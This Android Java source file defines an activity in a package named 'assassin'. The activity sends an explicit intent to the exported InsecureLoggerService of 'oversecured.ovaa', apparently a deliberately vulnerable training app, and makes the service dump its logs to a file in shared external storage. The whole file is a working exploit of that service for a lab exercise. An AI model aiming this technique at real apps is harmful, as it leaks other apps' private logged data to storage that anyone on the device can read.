package oversecured.plugin.assassin;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.io.File;

public class ServiceDumpActivity extends AppCompatActivity {
private static final String EXTRA_FILE = "oversecured.ovaa.extra.file";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.d("debug", "Started Activity");
        super.onCreate(savedInstanceState);

        Intent intent = new Intent("oversecured.ovaa.action.DUMP");
        intent.setClassName("oversecured.ovaa", "oversecured.ovaa.services.InsecureLoggerService");
        File out = new File( "/storage/emulated/0/Download/nouse/" + System.currentTimeMillis());

        intent.putExtra(EXTRA_FILE, out);

        startService(intent);
//        bindService(intent, mServiceConnection, BIND_AUTO_CREATE);
    }
}